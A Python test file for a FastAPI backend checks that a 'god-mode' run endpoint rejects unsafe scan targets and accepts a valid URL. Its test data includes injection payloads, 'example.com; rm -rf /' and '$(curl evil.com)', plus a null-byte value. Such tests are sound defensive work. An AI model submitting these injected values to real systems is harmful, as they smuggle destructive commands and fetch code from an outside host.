# tests/test_validation.py
import os
os.environ["ONEINFINITY_API_KEY"] = ""  # no auth enforcement for validation tests

import sys
sys.path.insert(0, "/home/devendra-yadav/oneinfinity")
from fastapi.testclient import TestClient
from web.backend.main import app

client = TestClient(app, raise_server_exceptions=False)


def test_god_mode_rejects_shell_metacharacters():
    """God-mode must reject targets with shell metacharacters."""
    resp = client.post(
        "/api/god-mode/run",
        json={"target": "example.com; rm -rf /"},
    )
    assert resp.status_code == 400, f"Expected 400, got {resp.status_code}"


def test_god_mode_rejects_command_substitution():
    """God-mode must reject command substitution in target."""
    resp = client.post(
        "/api/god-mode/run",
        json={"target": "$(curl evil.com)"},
    )
    assert resp.status_code == 400, f"Expected 400, got {resp.status_code}"


def test_god_mode_rejects_disallowed_chars():
    """Allowlist must catch characters not in _SAFE_TARGET_RE."""
    resp = client.post(
        "/api/god-mode/run",
        json={"target": "exam\x00ple.com"},  # null byte — not in allowlist
    )
    assert resp.status_code == 400, f"Expected 400, got {resp.status_code}"


def test_god_mode_accepts_valid_target():
    """Valid target must pass validation (not return 400)."""
    resp = client.post(
        "/api/god-mode/run",
        json={"target": "https://example.com/path?q=1#anchor"},
    )
    # 400 = validation error. Any other status = validation passed.
    assert resp.status_code != 400, f"Valid target was rejected: {resp.status_code} {resp.text}"


def test_validate_target_allowlist_blocks_novel_chars():
    """_validate_target must use allowlist, not just denylist."""
    from web.backend.main import _validate_target
    from fastapi import HTTPException

    # Null byte is not in _SHELL_META_RE but should fail the allowlist
    try:
        _validate_target("exam\x00ple.com")
        assert False, "Should have raised HTTPException for null byte"
    except HTTPException as e:
        assert e.status_code == 400
    except Exception as e:
        assert False, f"Wrong exception type: {type(e)}: {e}"
